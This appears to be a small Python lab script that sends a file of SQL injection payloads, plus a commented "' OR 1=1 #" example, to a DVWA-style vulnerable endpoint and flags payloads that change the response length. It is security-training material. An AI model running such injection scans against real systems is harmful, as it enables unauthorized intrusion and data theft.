import requests

url = 'http://10.10.26.154/vulnerabilities/sqli/'

#value = "' OR 1=1 #"
param_name = "id"

normal_params = {
    param_name : "",
    "Submit" : "Submit#"
}


headers = {
    "Host" : "10.10.26.154",
    "Referer" : "http://10.10.26.154/vulnerabilities/xss_r/",
    "Cookie" : "PHPSESSID=ldo5h95qgnioe02r4nsstslso4; security=low"
}

response = requests.get(url, headers=headers, params=normal_params)

code = response.status_code
resp = response.text

#-------------------------------------
payloads = open("sql.txt").read().splitlines()
for value in payloads:
    params = {
        param_name : value,
        "Submit" : "Submit#"
    }
    
#-----------------------------------------
    testResponse = requests.get(url, headers=headers, params=params)
    testCode = testResponse.status_code
    testResp = testResponse.text

    

    if len(testResp) != len(resp):
        print(f"{value} can cause SQL Injection!!!")
    
    


#if value in response.text:
#   print("This site is vuln with XSS!")
#   print(value)
#   print(f"{url}?{param_name}={value}")
